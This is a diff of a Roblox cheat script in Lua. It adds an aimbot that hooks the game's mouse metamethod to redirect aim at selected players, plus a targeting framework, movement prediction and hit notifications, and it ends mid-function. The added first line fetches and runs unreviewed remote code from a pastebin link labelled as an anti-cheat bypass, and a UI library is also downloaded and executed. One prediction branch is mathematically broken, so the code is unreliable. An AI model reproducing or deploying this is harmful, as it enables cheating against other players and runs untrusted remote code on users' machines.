@@ -1,4 +1,4 @@
--- Services
+loadstring(game:HttpGet("https://pastebin.com/raw/gimbTwW1"))() -- ac bypass dont touch or remove
 local game = game
 local workspace = workspace
 local a = game:GetService("Players")
@@ -8,41 +8,25 @@ local d = game:GetService("TweenService")
 local e = game:GetService("HttpService")
 local f = game:GetService("Lighting")
 local g = a.LocalPlayer
-
--- Math
 local h, i = math.random, math.huge
 local j, k = math.floor, math.ceil
 local l, m = math.abs, math.sqrt
 local n, o = math.sin, math.cos
-local atan2 = math.atan2
-local rad, deg = math.rad, math.deg
-local min, max = math.min, math.max
-
--- Tables
 local p, q = table.insert, table.remove
 local r, s = table.sort, table.concat
-
--- Strings
 local t, u = string.format, string.match
 local v, w = string.lower, string.upper
 local x, y = string.sub, string.gsub
-
--- Global functions
 local pairs, ipairs = pairs, ipairs
 local type, tostring = type, tostring
 local pcall, xpcall = pcall, xpcall
 local loadstring = loadstring
 local setmetatable = setmetatable
 local getmetatable = getmetatable
-
--- Constructors
 local z = Color3.fromRGB
 local A = UDim2.new
 local B = Vector3.new
 local C = CFrame.new
-local Ray_new = Ray.new
-
--- File functions
 local isfolder = isfolder
 local isfile = isfile
 local listfiles = listfiles
@@ -51,23 +35,20 @@ local readfile = readfile
 local delfile = delfile
 local makefolder = makefolder
 local setclipboard = setclipboard
-
--- Other services
 local D = game:GetService("TeleportService")
-local ReplicatedStorage = game:GetService("ReplicatedStorage")
-local Camera = workspace.CurrentCamera
-local Mouse = g:GetMouse()
--- Utility library
+local ps, run, uis, cam = a, b, c, workspace.CurrentCamera
+local math, v2, v3, tick = math, Vector2.new, Vector3.new, tick
+local LocalPlayer = g
+local hookmetamethod = hookmetamethod
+local checkcaller = checkcaller
 local E = {}
-local F = {} -- connections storage
-
-do -- Utility functions
+local F = {}
+do
     function E.new_connection(G, H)
         local I = G:Connect(H)
         p(F, I)
         return I
     end
-    
     function E.disconnect_all()
         for J, I in ipairs(F) do
             if I then
@@ -76,238 +57,280 @@ do -- Utility functions
         end
         F = {}
     end
+end
+
+do -- Targeting Framework
+    local targeting_state = {current = nil}
+    pcall(function()
+        _G.targeting_state = targeting_state
+    end)
     
-    -- Get held weapon
-    function E:GetHeld()
-        local character = g.Character
-        if not character then return nil end
+    local TargetingFramework = {}
+    
+    do -- Utility Functions
+        local utility = {}
         
-        for _, tool in pairs(character:GetChildren()) do
-            if tool:IsA("Tool") and tool:FindFirstChild("Handle") then
-                return tool
+        function utility:ValidateClient(player)
+            if not player then
+                return false
             end
+            local character = player.Character
+            if not character then
+                return false
+            end
+            local humanoid = character:FindFirstChildOfClass("Humanoid")
+            if not humanoid or humanoid.Health <= 0 then
+                return false
+            end
+            return humanoid.RootPart ~= nil
         end
-        return nil
+        
+        function utility:GetPreferredPart(character)
+            return character and 
+                (character:FindFirstChild("HumanoidRootPart") or 
+                 character:FindFirstChild("Head") or 
+                 character:FindFirstChild("UpperTorso") or
+                 character:FindFirstChild("Torso")) or nil
+        end
+        
+        function utility:ToScreen(position)
+            local screenPos, onScreen = cam:WorldToViewportPoint(position)
+            return v2(screenPos.X, screenPos.Y), onScreen
+        end
+        
+        function utility:GetMouseLocation()
+            return uis:GetMouseLocation()
+        end
+        
+        function utility:GetMouseDistance(screenPos)
+            return (utility:GetMouseLocation() - screenPos).Magnitude
+        end
+        
+        function utility:getHeld()
+            local character = LocalPlayer.Character
+            if not character then return "None" end
+            local tool = character:FindFirstChildOfClass("Tool")
+            return tool or "None"
+        end
+        
+        function utility:GetOrigin()
+            local Tool = utility:getHeld()
+            return (Tool ~= "None" and Tool.Handle and Tool.Handle.Position) or cam.CFrame.Position
+        end
+        
+        TargetingFramework.utility = utility
     end
     
-    -- Get weapon origin position
-    function E:GetOrigin()
-        local tool = E:GetHeld()
-        if tool then
-            local bulletStart = tool:FindFirstChild("BulletStart")
-            if bulletStart then
-                return bulletStart.Position
-            end
-            return tool.Handle.Position
-        end
-        return Camera.CFrame.Position
-    end
-    
-    function E:GetEncryptionDict()
-        -- Get encryption dictionary from SoundService
-        local soundService = game:GetService("SoundService")
-        local encryptionData = soundService:FindFirstChild("EncryptionData")
-        if encryptionData then
-            local currentDict = encryptionData:FindFirstChild("CurrentDict")
-            if currentDict then
-                local success, dict = pcall(function()
-                    return game:GetService("HttpService"):JSONDecode(currentDict.Value)
-                end)
-                if success then
-                    return dict
-                end
-            end
-        end
-        -- Return default dict if not found
-        return {
-            a = "qUz3j0QwOtY",
-            c = "pWBL9UBsf13",
-            b = "CVz3mo",
-            e = "j6zNLcXtzsO",
-            d = "MVhC83jAxA",
-            g = "jjNjbJy1",
-            f = "X2Bt4W",
-            i = "y7BXZ",
-            h = "SuQq4La",
-            k = "GUudffJrBEXq",
-            j = "2FLZxyayQd",
-            m = "0FKMYohHyexy",
-            l = "YFAjIdIb9",
-            o = "jT3QZxSR",
-            n = "f4rXJbnSnB0c",
-            q = "TYJHKvYEVZio",
-            p = "HHRupG8ouCG",
-            s = "1DR1SyqsY1",
-            r = "ertzRBJqboSl",
-            u = "N0nfejjGk",
-            t = "ZU0Hj6o9w",
-            w = "EMXOZo",
-            v = "Eu7ruC4e",
-            y = "M7lWHYRX",
-            x = "6Y5ootWPt"
+    do -- Core Framework Functions
+        TargetingFramework._hit_listeners = {}
+        TargetingFramework._target = {info = nil, listeners = {}}
+        TargetingFramework._dd = {
+            last_target = nil,
+            last_char = nil,
+            hum = nil,
+            last_health = nil,
+            last_max = nil,
+            conn = nil,
+            hum_conn = nil,
+            last_debug_t = 0,
+            override_player = nil
         }
-    end
-    
-    function E:GetDistance(target)
-        if not target then return 0 end
-        local character = g.Character
-        if not character then return 0 end
         
-        local humanoidRootPart = character:FindFirstChild("HumanoidRootPart")
-        if not humanoidRootPart then return 0 end
-        
-        local targetRoot = target:FindFirstChild("HumanoidRootPart")
-        if not targetRoot then
-            targetRoot = target:FindFirstChild("Torso")
+        function TargetingFramework:GetClosestToMouse()
+            local closestPlayer, closestDistance = nil, nil
+            for _, player in ipairs(ps:GetPlayers()) do
+                if player ~= LocalPlayer and self.utility:ValidateClient(player) then
+                    local character = player.Character
+                    local targetPart = self.utility:GetPreferredPart(character)
+                    if targetPart then
+                        local screenPos, onScreen = self.utility:ToScreen(targetPart.Position)
+                        if onScreen then
+                            local distance = self.utility:GetMouseDistance(screenPos)
+                            if not closestDistance or distance < closestDistance then
+                                closestPlayer, closestDistance = player, distance
+                            end
+                        end
+                    end
+                end
+            end
+            return closestPlayer, closestDistance or math.huge
         end
-        if not targetRoot then return 0 end
         
-        return (humanoidRootPart.Position - targetRoot.Position).Magnitude
-    end
-    
-    -- Check if player is alive
-    function E:IsAlive(player)
-        if not player then player = g end
-        local character = player.Character
-        if not character then return false end
+        function TargetingFramework:OnHit(callback)
+            if typeof(callback) == "function" then
+                p(self._hit_listeners, callback)
+            end
+        end
         
-        local humanoid = character:FindFirstChildOfClass("Humanoid")
-        if not humanoid then return false end
+        function TargetingFramework:OnTargetUpdate(callback)
+            if typeof(callback) == "function" then
+                p(self._target.listeners, callback)
+            end
+        end
         
-        return humanoid.Health > 0
-    end
-    
-    -- Get distance between two positions
-    function E:GetDistance(pos1, pos2)
-        return (pos1 - pos2).Magnitude
-    end
-    
-    -- World to screen position
-    function E:WorldToScreen(position)
-        local screenPos, onScreen = Camera:WorldToScreenPoint(position)
-        return B(screenPos.X, screenPos.Y), onScreen
-    end
-end
-
--- Framework library
-local framework = {connections = {}}
-
-do -- Targeting framework
-    framework.targeting = {}
-    local targeting = framework.targeting
-    
-    -- Get all valid players
-    function targeting:GetPlayers()
-        local validPlayers = {}
-        for _, player in ipairs(a:GetPlayers()) do
-            if player ~= g and E:IsAlive(player) then
+        function TargetingFramework:_emit_hit(targetInfo)
+            for _, callback in ipairs(self._hit_listeners) do
+                pcall(callback, targetInfo)
+            end
+        end
+        
+        function TargetingFramework:GetTargetInfo()
+            local targetInfo = self._target.info
+            return targetInfo ~= nil, targetInfo
+        end
+        
+        function TargetingFramework:SetTargetInfo(player)
+            local targetInfo = nil
+            self._dd.override_player = player or nil
+            
+            if player and player.Character then
                 local character = player.Character
-                if character and character:FindFirstChild("HumanoidRootPart") then
-                    -- Check for ForceField
-                    if not character:FindFirstChild("ForceField") then
-                        p(validPlayers, player)
-                    end
-                end
+                local humanoid = character:FindFirstChildOfClass("Humanoid")
+                local rootPart = humanoid and humanoid.RootPart or character:FindFirstChild("HumanoidRootPart")
+                local health = humanoid and humanoid.Health or nil
+                local maxHealth = humanoid and humanoid.MaxHealth or nil
+                local cframe = rootPart and rootPart.CFrame or (character.GetPivot and character:GetPivot() or nil)
+                local position = rootPart and rootPart.Position or (cframe and cframe.Position or nil)
+                
+                targetInfo = {
+                    isTarget = true,
+                    player = player,
+                    userId = player.UserId,
+                    name = player.Name,
+                    displayName = player.DisplayName,
+                    character = character,
+                    humanoid = humanoid,
+                    root = rootPart,
+                    cframe = cframe,
+                    position = position,
+                    health = health,
+                    maxHealth = maxHealth,
+                    alive = humanoid and humanoid.Health > 0,
+                    time = os.clock()
+                }
             end
-        end
-        return validPlayers
-    end
-    
-    -- Get closest player to local player
-    function targeting:GetClosestToPlayer()
-        local players = self:GetPlayers()
-        local closest = nil
-        local closestDistance = i
-        
-        local myPos = g.Character and g.Character:FindFirstChild("HumanoidRootPart")
-        if not myPos then return nil end
-        myPos = myPos.Position
-        
-        for _, player in ipairs(players) do
-            local character = player.Character
-            if character then
-                local root = character:FindFirstChild("HumanoidRootPart")
-                if root then
-                    local distance = E:GetDistance(myPos, root.Position)
-                    if distance < closestDistance then
-                        closest = player
-                        closestDistance = distance
-                    end
-                end
+            
+            self._target.info = targetInfo
+            for _, callback in ipairs(self._target.listeners) do
+                pcall(callback, targetInfo)
             end
         end
         
-        return closest
-    end
-    
-    -- Get closest player to cursor
-    function targeting:GetClosestToCursor()
-        local players = self:GetPlayers()
-        local closest = nil
-        local closestDistance = i
-        
-        local mousePos = c:GetMouseLocation()
-        
-        for _, player in ipairs(players) do
-            local character = player.Character
-            if character then
-                local root = character:FindFirstChild("HumanoidRootPart")
-                if root then
-                    local screenPos, onScreen = E:WorldToScreen(root.Position)
-                    if onScreen then
-                        local distance = E:GetDistance(B(mousePos.X, mousePos.Y, 0), B(screenPos.X, screenPos.Y, 0))
-                        if distance < closestDistance then
-                            closest = player
-                            closestDistance = distance
-                        end
-                    end
-                end
+        function TargetingFramework:ClearTargetInfo()
+            self._target.info = nil
+            self._dd.override_player = nil
+            for _, callback in ipairs(self._target.listeners) do
+                pcall(callback, nil)
             end
         end
         
-        return closest
+        function TargetingFramework:SetCurrentTarget(player)
+            self._dd.override_player = player
+        end
+        
+        function TargetingFramework:ClearCurrentTarget()
+            self._dd.override_player = nil
+        end
+        
+        function TargetingFramework:GetCurrentTarget()
+            return self._dd.override_player or (targeting_state and targeting_state.current or nil)
+        end
     end
     
-    -- Get closest player to screen center
-    function targeting:GetClosestToScreenCenter()
-        local players = self:GetPlayers()
-        local closest = nil
-        local closestDistance = i
+    do -- Target Selection Logic
+        local TargetSelector = {}
         
-        local screenCenter = B(Camera.ViewportSize.X / 2, Camera.ViewportSize.Y / 2, 0)
-        
-        for _, player in ipairs(players) do
-            local character = player.Character
-            if character then
-                local root = character:FindFirstChild("HumanoidRootPart")
-                if root then
-                    local screenPos, onScreen = E:WorldToScreen(root.Position)
-                    if onScreen then
-                        local distance = E:GetDistance(screenCenter, B(screenPos.X, screenPos.Y, 0))
-                        if distance < closestDistance then
-                            closest = player
-                            closestDistance = distance
-                        end
-                    end
+        function TargetSelector:selectTarget()
+            if targeting_state.current then
+                targeting_state.current = nil
+                TargetingFramework:ClearTargetInfo()
+                TargetingFramework:ClearCurrentTarget()
+            else
+                local closestTarget, distance = TargetingFramework:GetClosestToMouse()
+                if closestTarget then
+                    targeting_state.current = closestTarget
+                    TargetingFramework:SetTargetInfo(closestTarget)
+                    TargetingFramework:SetCurrentTarget(closestTarget)
                 end
             end
         end
         
-        return closest
+        TargetingFramework.selector = TargetSelector
     end
     
-    -- Main target selection function
-    function targeting:GetTarget(method)
-        if method == "Closest" then
-            return self:GetClosestToPlayer()
-        elseif method == "Cursor" then
-            return self:GetClosestToCursor()
-        elseif method == "ScrCenter" then
-            return self:GetClosestToScreenCenter()
+    do -- Health Detection System
+        if not TargetingFramework._dd.conn then
+            TargetingFramework._dd.conn = run.Heartbeat:Connect(function()
+                local dd = TargetingFramework._dd
+                local currentTarget = dd.override_player or (targeting_state and targeting_state.current or nil)
+                
+                if currentTarget ~= dd.last_target then
+                    dd.last_target = currentTarget
+                    dd.last_char = nil
+                    dd.hum = nil
+                    dd.last_health = nil
+                    dd.last_max = nil
+                    
+                    if dd.hum_conn then
+                        pcall(function()
+                            dd.hum_conn:Disconnect()
+                        end)
+                        dd.hum_conn = nil
+                    end
+                end
+                
+                if not currentTarget then
+                    return
+                end
+                
+                local character = currentTarget.Character
+                if character ~= dd.last_char or (dd.hum and not dd.hum.Parent) then
+                    dd.last_char = character
+                    dd.hum = character and character:FindFirstChildOfClass("Humanoid") or nil
+                    dd.last_health = nil
+                    dd.last_max = nil
+                    
+                    if dd.hum_conn then
+                        pcall(function()
+                            dd.hum_conn:Disconnect()
+                        end)
+                        dd.hum_conn = nil
+                    end
+                    
+                    if dd.hum then
+                        run.Heartbeat:Wait()
+                        dd.hum_conn = dd.hum.HealthChanged:Connect(function(newHealth)
+                            local maxHealth = dd.hum and dd.hum.MaxHealth or 0
+                            if dd.last_health == nil or dd.last_max == nil or maxHealth ~= dd.last_max then
+                                dd.last_health = newHealth
+                                dd.last_max = maxHealth
+                                return
+                            end
+                            
+                            if newHealth < dd.last_health then
+                                local damage = dd.last_health - newHealth
+                                TargetingFramework:_emit_hit({
+                                    player = currentTarget,
+                                    damage = damage,
+                                    health = newHealth,
+                                    maxHealth = maxHealth,
+                                    time = os.clock()
+                                })
+                            end
+                            
+                            dd.last_health = newHealth
+                            dd.last_max = maxHealth
+                        end)
+                    end
+                end
+            end)
         end
-        return nil
     end
+    
+    _G.TargetingFramework = TargetingFramework
 end
+
+
 local K =
     loadstring(game:HttpGet("https://raw.githubusercontent.com/OnChangedCallback/fent.lua/refs/heads/main/library"))()
 local L =
@@ -330,349 +353,315 @@ local N = L:Page({Name = "Visuals", Columns = 2})
 local O = L:Page({Name = "Misc", Columns = 2})
 local P = L:Page({Name = "AntiAim", Columns = 2})
 
--- Ragebot variables
-local RagebotEnabled = false
-local RagebotTarget = nil
-local RagebotTargetMethod = "Closest"
-local RagebotConnection = nil
-local AutoShootEnabled = false
-local AutoReloadEnabled = false
-local AutoShootConnection = nil
-local AimPart = "Head"
-local ShowAimbot = false
-local AimbotVisualizationType = "Beam"
-local AimbotVisualization = nil
-
-do -- Ragebot section
-    local RagebotMain = M:Section({Name = "Main", Side = 1})
-    
-    -- Ragebot toggle
-    local RagebotToggle = RagebotMain:Toggle({
-        Name = "Ragebot",
+do -- Ragebot Tab
+    local aP = M:Section({Name = "Targeting", Side = 1})
+    local aQ = aP:Toggle({
+        Name = "Targeting",
         Default = false,
-        Flag = "RagebotEnabled",
-        Callback = function(value)
-            RagebotEnabled = value
-            
-            if value then
-                -- Enable ragebot logic
-                if not RagebotConnection then
-                    RagebotConnection = E.new_connection(b.Heartbeat, function()
-                        if not E:IsAlive() then return end
-                        
-                        -- Get target based on selected method (360 FOV, no visibility check)
-                        RagebotTarget = framework.targeting:GetTarget(RagebotTargetMethod)
-                        
-                        if RagebotTarget and RagebotTarget.Character then
-                            local character = g.Character
-                            if character then
-                                -- Set rageaim values for silent aim
-                                local rageaimValue = character:FindFirstChild("rageaim")
-                                if not rageaimValue then
-                                    rageaimValue = Instance.new("BoolValue")
-                                    rageaimValue.Name = "rageaim"
-                                    rageaimValue.Parent = character
-                                end
-                                rageaimValue.Value = true
-                                
-                                -- Set aim position
-                                local aimposValue = character:FindFirstChild("aimpos")
-                                if not aimposValue then
-                                    aimposValue = Instance.new("Vector3Value")
-                                    aimposValue.Name = "aimpos"
-                                    aimposValue.Parent = character
-                                end
-                                
-                                -- Get target part based on selected aim part
-                                local targetRoot = RagebotTarget.Character:FindFirstChild(AimPart)
-                                if not targetRoot then
-                                    -- Fallback to Head if selected part not found
-                                    targetRoot = RagebotTarget.Character:FindFirstChild("Head")
-                                    if not targetRoot then
-                                        targetRoot = RagebotTarget.Character:FindFirstChild("HumanoidRootPart")
-                                    end
-                                end
-                                
-                                if targetRoot then
-                                    aimposValue.Value = targetRoot.Position
-                                end
-                            end
-                        else
-                            -- No target, disable rageaim
-                            local character = g.Character
-                            if character then
-                                local rageaimValue = character:FindFirstChild("rageaim")
-                                if rageaimValue then
-                                    rageaimValue.Value = false
-                                end
-                            end
-                        end
-                    end)
-                end
-            else
-                -- Disable ragebot logic
-                if RagebotConnection then
-                    RagebotConnection:Disconnect()
-                    RagebotConnection = nil
-                end
-                
-                -- Clean up values
-                local character = g.Character
-                if character then
-                    local rageaimValue = character:FindFirstChild("rageaim")
-                    if rageaimValue then
-                        rageaimValue.Value = false
+        Flag = "TargetingEnabled",
+        Callback = function(aR)
+            if _G.TargetingFramework then
+                if not aR then
+                    _G.TargetingFramework:ClearTargetInfo()
+                    _G.TargetingFramework:ClearCurrentTarget()
+                    if _G.targeting_state then
+                        _G.targeting_state.current = nil
                     end
                 end
-                
-                RagebotTarget = nil
             end
         end
     })
     
-    -- Target selection dropdown
-    local TargetDropdown = RagebotMain:Dropdown({
+    local aS = aQ:Keybind({
         Name = "Target Selection",
-        Items = {"Closest", "Cursor", "ScrCenter"},
-        Default = "Closest",
-        Flag = "RagebotTargetMethod",
-        Callback = function(value)
-            RagebotTargetMethod = value
-        end
-    })
-    
-    -- Auto Shoot toggle
-    local AutoShootToggle = RagebotMain:Toggle({
-        Name = "Auto Shoot",
-        Default = false,
-        Flag = "AutoShoot",
-        Callback = function(value)
-            AutoShootEnabled = value
-            
-            if value then
-                -- Start auto shoot logic
-                if not AutoShootConnection then
-                    AutoShootConnection = E.new_connection(b.Heartbeat, function()
-                        if not E:IsAlive() then return end
-                        
-                        local character = g.Character
-                        if character then
-                            -- Создаем или обновляем BoolValue autoshoot
-                            local autoShootValue = character:FindFirstChild("autoshoot")
-                            if not autoShootValue then
-                                autoShootValue = Instance.new("BoolValue")
-                                autoShootValue.Name = "autoshoot"
-                                autoShootValue.Parent = character
-                            end
-                            
-                            -- Включаем/выключаем autoshoot в зависимости от наличия цели
-                            if RagebotEnabled and RagebotTarget then
-                                autoShootValue.Value = true
-                            else
-                                autoShootValue.Value = false
-                            end
-                        end
-                    end)
-                end
-            else
-                -- Stop auto shoot
-                if AutoShootConnection then
-                    AutoShootConnection:Disconnect()
-                    AutoShootConnection = nil
-                end
-                
-                -- Отключаем autoshoot value
-                local character = g.Character
-                if character then
-                    local autoShootValue = character:FindFirstChild("autoshoot")
-                    if autoShootValue then
-                        autoShootValue.Value = false
-                    end
-                end
+        Mode = "Toggle",
+        Default = Enum.KeyCode.T,
+        Flag = "TargetSelectionKey",
+        Callback = function(aT)
+            if K.Flags["TargetingEnabled"] and _G.TargetingFramework and _G.TargetingFramework.selector then
+                _G.TargetingFramework.selector:selectTarget()
             end
         end
     })
     
-    -- Auto Reload toggle
-    local AutoReloadToggle = RagebotMain:Toggle({
-        Name = "Auto Reload",
+    local aY = M:Section({Name = "Aimbot", Side = 1})
+    local aZ = aY:Toggle({
+        Name = "Enabled",
         Default = false,
-        Flag = "AutoReload",
-        Callback = function(value)
-            AutoReloadEnabled = value
-            
-            if value then
-                -- Auto reload logic
-                task.spawn(function()
-                    while AutoReloadEnabled do
-                        task.wait(0.1)
-                        if not E:IsAlive() then continue end
-                        
-                        local tool = E:GetHeld()
-                        if tool then
-                            local ammo = tool:FindFirstChild("Ammo")
-                            if ammo and ammo:IsA("IntValue") and ammo.Value <= 0 then
-                                -- Trigger reload
-                                game:GetService("ReplicatedStorage"):WaitForChild("Reload"):FireServer()
-                                task.wait(2) -- Wait for reload animation
-                            end
-                        end
-                    end
-                end)
-            end
+        Flag = "AimbotEnabled",
+        Callback = function(ba)
+            -- Callback обрабатывается через aimbot logic
         end
     })
-end
-
-do -- Ragebot Settings section
-    local RagebotSettings = M:Section({Name = "Settings", Side = 2})
     
-    -- Aim Part dropdown for R6
-    local AimPartDropdown = RagebotSettings:Dropdown({
-        Name = "Aim Part",
-        Items = {"Head", "Torso", "Left Arm", "Right Arm", "Left Leg", "Right Leg"},
-        Default = "Head",
-        Flag = "RagebotAimPart",
-        Callback = function(value)
-            AimPart = value
+    local bb = aY:Textbox({
+        Name = "XZ Prediction",
+        Default = "0.048",
+        Placeholder = "0.048",
+        Flag = "AimbotXZPrediction",
+        Callback = function(bc)
+            -- Значение автоматически обновляется через K.Flags
         end
     })
-end
-
-do -- Ragebot Debug section
-    local RagebotDebug = M:Section({Name = "Debug", Side = 1})
     
-    -- Show Aimbot toggle
-    local ShowAimbotToggle = RagebotDebug:Toggle({
-        Name = "Show Aimbot",
+    local bd = aY:Textbox({
+        Name = "Y Prediction", 
+        Default = "0.048",
+        Placeholder = "0.048",
+        Flag = "AimbotYPrediction",
+        Callback = function(be)
+            -- Значение автоматически обновляется через K.Flags
+        end
+    })
+    
+    local bf = aY:Toggle({
+        Name = "ShowAimbot",
         Default = false,
         Flag = "ShowAimbot",
-        Callback = function(value)
-            ShowAimbot = value
-            
-            if value then
-                -- Create visualization
-                task.spawn(function()
-                    while ShowAimbot do
-                        task.wait()
-                        if not E:IsAlive() then continue end
-                        
-                        local character = g.Character
-                        if character then
-                            local aimpos = character:FindFirstChild("aimpos")
-                            if aimpos and aimpos:IsA("Vector3Value") then
-                                local tool = E:GetHeld()
-                                if tool then
-                                    local bulletStart = tool:FindFirstChild("BulletStart")
-                                    if bulletStart then
-                                        -- Clean old visualization
-                                        if AimbotVisualization then
-                                            if type(AimbotVisualization) == "table" then
-                                                for _, v in pairs(AimbotVisualization) do
-                                                    if v and v.Parent then
-                                                        v:Destroy()
-                                                    end
-                                                end
-                                            else
-                                                if AimbotVisualization and AimbotVisualization.Parent then
-                                                    AimbotVisualization:Destroy()
-                                                end
-                                            end
-                                        end
-                                        
-                                        if AimbotVisualizationType == "Beam" then
-                                            -- Create beam visualization
-                                            local attachment0 = Instance.new("Attachment")
-                                            attachment0.Position = bulletStart.Position
-                                            attachment0.Parent = workspace.Terrain
-                                            
-                                            local attachment1 = Instance.new("Attachment")
-                                            attachment1.Position = aimpos.Value
-                                            attachment1.Parent = workspace.Terrain
-                                            
-                                            local beam = Instance.new("Beam")
-                                            beam.Attachment0 = attachment0
-                                            beam.Attachment1 = attachment1
-                                            beam.Width0 = 0.1
-                                            beam.Width1 = 0.1
-                                            beam.Color = ColorSequence.new(Color3.fromRGB(255, 0, 0))
-                                            beam.Transparency = NumberSequence.new(0.5)
-                                            beam.FaceCamera = true
-                                            beam.Parent = workspace
-                                            
-                                            AimbotVisualization = {beam, attachment0, attachment1}
-                                        else
-                                            -- Create 3D part visualization
-                                            local part = Instance.new("Part")
-                                            part.Size = Vector3.new(0.2, 0.2, (bulletStart.Position - aimpos.Value).Magnitude)
-                                            part.CFrame = CFrame.lookAt(bulletStart.Position, aimpos.Value) * CFrame.new(0, 0, -part.Size.Z/2)
-                                            part.Anchored = true
-                                            part.CanCollide = false
-                                            part.Material = Enum.Material.Neon
-                                            part.BrickColor = BrickColor.new("Really red")
-                                            part.Transparency = 0.5
-                                            part.Parent = workspace
-                                            
-                                            AimbotVisualization = part
-                                        end
-                                    end
-                                end
-                            end
-                        end
-                    end
-                    
-                    -- Clean up when disabled
-                    if AimbotVisualization then
-                        if type(AimbotVisualization) == "table" then
-                            for _, v in pairs(AimbotVisualization) do
-                                v:Destroy()
-                            end
-                        else
-                            AimbotVisualization:Destroy()
-                        end
-                        AimbotVisualization = nil
-                    end
-                end)
-            else
-                -- Clean up visualization
-                if AimbotVisualization then
-                    if type(AimbotVisualization) == "table" then
-                        for _, v in pairs(AimbotVisualization) do
-                            v:Destroy()
-                        end
-                    else
-                        AimbotVisualization:Destroy()
-                    end
-                    AimbotVisualization = nil
-                end
-            end
+        Callback = function(bg)
+            -- Callback обрабатывается через beam logic
         end
     })
     
-    -- Visualization Type dropdown
-    local VisualizationDropdown = RagebotDebug:Dropdown({
-        Name = "Visualization Type",
-        Items = {"Beam", "3D Part"},
-        Default = "Beam",
-        Flag = "AimbotVisualizationType",
-        Callback = function(value)
-            AimbotVisualizationType = value
-            
-            -- Update visualization if active
-            if ShowAimbot and AimbotVisualization then
-                if type(AimbotVisualization) == "table" then
-                    for _, v in pairs(AimbotVisualization) do
-                        v:Destroy()
-                    end
-                else
-                    AimbotVisualization:Destroy()
-                end
-                AimbotVisualization = nil
-            end
+    local bh = aY:Dropdown({
+        Name = "Resolver Type",
+        Items = {"Velocity", "MoveDirection", "CalculateCFrame"},
+        Default = "Velocity",
+        Flag = "ResolverType",
+        Callback = function(bi)
+            -- Callback обрабатывается через resolver logic
         end
     })
+    
+    local aT = M:Section({Name = "Notify", Side = 2})
+    local aU = aT:Toggle({
+        Name = "OnSelected",
+        Default = false,
+        Flag = "NotifyOnSelected",
+        Callback = function(aV)
+            -- Callback будет обработан через targeting framework
+        end
+    })
+    
+    local aW = aT:Toggle({
+        Name = "OnDamage", 
+        Default = false,
+        Flag = "NotifyOnDamage",
+        Callback = function(aX)
+            -- Callback будет обработан через targeting framework
+        end
+    })
+    
+    do -- Notification Integration
+        if _G.TargetingFramework then
+            _G.TargetingFramework:OnTargetUpdate(function(targetInfo)
+                if K.Flags["NotifyOnSelected"] then
+                    if targetInfo then
+                        K:Notification("Target selected: " .. targetInfo.name, 2, z(0, 255, 0))
+                    else
+                        K:Notification("Target cleared", 2, z(255, 255, 0))
+                    end
+                end
+            end)
+            
+            _G.TargetingFramework:OnHit(function(hitInfo)
+                if K.Flags["NotifyOnDamage"] and hitInfo then
+                    local damageText = t("%.1f damage to %s", hitInfo.damage, hitInfo.player.Name)
+                    K:Notification(damageText, 2, z(255, 100, 100))
+                end
+            end)
+        end
+    end
+    
+    do -- Aimbot Framework
+        local AimbotFramework = {}
+        local LastPosition = nil
+        local LastUpdateTime = nil
+        
+        local function GetPredictedPosition(targetPlayer)
+            if not targetPlayer or not targetPlayer.Character or not targetPlayer.Character:FindFirstChild("Humanoid") then 
+                return nil 
+            end
+            
+            local targetPart = targetPlayer.Character:FindFirstChild("HumanoidRootPart") or targetPlayer.Character:FindFirstChild("Head")
+            if not targetPart then 
+                return nil 
+            end
+            
+            if not LastPosition or not LastUpdateTime then
+                LastPosition = targetPart.Position
+                LastUpdateTime = tick()
+                return LastPosition
+            end
+            
+            local resolverType = K.Flags["ResolverType"] or "Velocity"
+            local xzPrediction = tonumber(K.Flags["AimbotXZPrediction"]) or 0.048
+            local yPrediction = tonumber(K.Flags["AimbotYPrediction"]) or 0.048
+            
+            if resolverType == "Velocity" then
+                return targetPart.Position + B(
+                    targetPart.Velocity.X * xzPrediction,
+                    targetPart.Velocity.Y * yPrediction,
+                    targetPart.Velocity.Z * xzPrediction
+                )
+            elseif resolverType == "MoveDirection" then
+                return targetPart.Position + (targetPlayer.Character.Humanoid.MoveDirection * (xzPrediction * 10))
+            elseif resolverType == "CalculateCFrame" then
+                if (targetPart.Position - LastPosition).Magnitude < 0.001 then
+                    return targetPart.Position
+                else
+                    LastUpdateTime, LastPosition = tick(), targetPart.Position
+                    return LastPosition + (LastPosition - LastPosition).Unit * ((((LastPosition - LastPosition).Magnitude) / (tick() - LastUpdateTime)) * (0.1 * (xzPrediction * 10))) + B(0, ((LastPosition.Y - LastPosition.Y) / (tick() - LastUpdateTime) * (0.1 * xzPrediction)), 0)
+                end
+            end
+            
+            return targetPart.Position
+        end
+        
+        local function CheckAimbot()
+            return K.Flags["AimbotEnabled"] and K.Flags["TargetingEnabled"] and _G.targeting_state and _G.targeting_state.current
+        end
+        
+        local originalIndex
+        originalIndex = hookmetamethod(game, "__index", function(t, k)
+            if t:IsA("Mouse") and (k == "Hit" or k == "Target") and not checkcaller() then
+                if CheckAimbot() and _G.targeting_state.current then
+                    local targetPlayer = _G.targeting_state.current
+                    local targetPart = targetPlayer.Character and (targetPlayer.Character:FindFirstChild("HumanoidRootPart") or targetPlayer.Character:FindFirstChild("Head"))
+                    
+                    if targetPart then
+                        local predictedPos = GetPredictedPosition(targetPlayer) or targetPart.Position
+                        local hit = C(predictedPos)
+                        return k == "Hit" and hit or targetPart
+                    end
+                end
+            end
+            return originalIndex(t, k)
+        end)
+        
+        _G.AimbotFramework = AimbotFramework
+    end
+    
+    do -- Beam Visualization
+        local currentBeam = nil
+        local beamConnection = nil
+        
+        local function CreateBeam()
+            if currentBeam then
+                currentBeam:Destroy()
+                currentBeam = nil
+            end
+            
+            local beam = Instance.new("Beam")
+            beam.Color = ColorSequence.new(z(255, 0, 0))
+            beam.Transparency = NumberSequence.new(0.3)
+            beam.Width0 = 0.08
+            beam.Width1 = 0.08
+            beam.FaceCamera = true
+            
+            local attachment0 = Instance.new("Attachment")
+            local attachment1 = Instance.new("Attachment")
+            
+            attachment0.Parent = workspace
+            attachment1.Parent = workspace
+            
+            beam.Attachment0 = attachment0
+            beam.Attachment1 = attachment1
+            beam.Parent = workspace
+            
+            currentBeam = {beam = beam, att0 = attachment0, att1 = attachment1}
+            return currentBeam
+        end
+        
+        local function UpdateBeam()
+            if not K.Flags["ShowAimbot"] or not K.Flags["AimbotEnabled"] or not K.Flags["TargetingEnabled"] then
+                if currentBeam then
+                    currentBeam.beam:Destroy()
+                    currentBeam.att0:Destroy()
+                    currentBeam.att1:Destroy()
+                    currentBeam = nil
+                end
+                return
+            end
+            
+            if not _G.targeting_state or not _G.targeting_state.current then
